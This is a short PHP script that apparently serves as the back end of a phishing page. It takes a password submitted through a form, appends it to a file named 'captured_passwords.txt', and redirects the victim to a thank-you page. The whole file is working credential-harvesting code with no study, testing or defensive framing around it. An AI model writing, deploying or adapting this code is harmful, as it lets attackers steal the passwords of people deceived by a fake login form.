<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', '/php-error.log');

// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the password from the form input
    $password = $_POST['input'];

    // Specify the file where passwords will be saved
    $file = __DIR__ . '/captured_passwords.txt';

    // Open the file in append mode
    $fp = fopen($file, 'a');

    // Check if the file was opened successfully
    if ($fp) {
        // Append the password followed by a newline
        fwrite($fp, $password . PHP_EOL);

        // Close the file
        fclose($fp);

        // Redirect the user to thank_you.html
        header('Location: thank_you.html');
        exit; // Make sure no further code is executed after redirection
    } else {
        // Handle errors, e.g., file could not be opened
        // Since header redirection must happen before any output, consider logging errors or handling them differently if this section is reached
        die('Error: Unable to save the password. Please check the file permissions.');
    }
} else {
    // Redirect back to the index.html if the form was not submitted
    header('Location: index.html');
    exit;
}
?>
